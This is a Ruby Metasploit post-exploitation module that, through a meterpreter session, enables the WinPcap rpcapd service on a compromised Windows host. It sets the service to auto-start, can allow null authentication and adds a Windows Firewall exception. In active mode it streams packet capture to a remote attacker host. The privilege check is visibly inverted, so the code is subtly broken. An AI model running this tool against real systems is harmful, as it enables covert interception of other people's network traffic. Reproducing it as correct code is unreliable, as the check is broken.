##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Remote Packet Capture Service Starter',
        'Description' => %q{
          This module enables the Remote Packet Capture System (rpcapd service)
          included in the default installation of Winpcap. The module allows you to set up
          the service in passive or active mode (useful if the client is behind a firewall).
          If authentication is enabled you need a local user account to capture traffic.
          PORT will be used depending of the mode configured.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
        'Platform' => 'win',
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('NULLAUTH', [ true, 'Enable Null Authentication.', true]),
        OptBool.new('ACTIVE', [ true, 'Enable rpcapd in active mode (passive by default).', false]),
        OptAddress.new('RHOST', [ false, 'Remote host to connect (set in active mode only).']),
        OptInt.new('PORT', [ true, 'Local/Remote port to capture traffic.', 2002])
      ]
    )
  end

  def run
    if is_admin?
      print_error("You don't have enough privileges. Try getsystem.")
      return
    end

    serv = service_info('rpcapd')
    print_status("Checking if machine #{sysinfo['Computer']} has rpcapd service")

    if serv[:display] !~ /remote/i
      print_error("This machine doesn't seem to have the rpcapd service")
      return
    end

    print_status("Rpcap service found: #{serv[:display]}")

    start_type = serv[:starttype]
    prog = get_env('ProgramFiles') << '\\winpcap\\rpcapd.exe'
    if start_type != START_TYPE_AUTO
      print_status("Setting rpcapd as 'auto' service")
      service_change_startup('rpcapd', START_TYPE_AUTO)
    end

    if datastore['ACTIVE']
      if datastore['RHOST'].nil?
        print_error('RHOST is not set ')
        return
      end
      p = prog << " -d -a #{datastore['RHOST']},#{datastore['PORT']} -v "
      print_status("Installing rpcap in ACTIVE mode (remote port: #{datastore['PORT']})")
    else
      fw_enable(prog)
      print_status("Installing rpcap in PASSIVE mode (local port: #{datastore['PORT']}) ")
      p = prog << " -d -p #{datastore['PORT']} "
    end

    if datastore['NULLAUTH']
      p << '-n'
    end

    run_rpcapd(p)
  end

  def run_rpcapd(cmdline)
    service_name = 'rpcapd'
    if service_restart(service_name)
      print_good("Rpcapd started successfully: #{cmdline}")
    else
      print_error('There was an error restarting rpcapd.exe.')
    end
  rescue StandardError => e
    print_error("The following error was encountered: #{e.class} #{e}")
  end

  def fw_enable(prog)
    print_status('Enabling rpcapd.exe in Windows Firewall')
    if file_exist?(prog)
      cmd_exec('netsh', "firewall add allowedprogram \"#{prog}\" \"Windows Service\" ENABLE ", 30)
    else
      print_error("rpcad.exe doesn't exist in #{prog}. Check the installation of WinPcap")
    end
  rescue StandardError => e
    print_status("The following error was encountered: #{e.class} #{e}")
  end
end
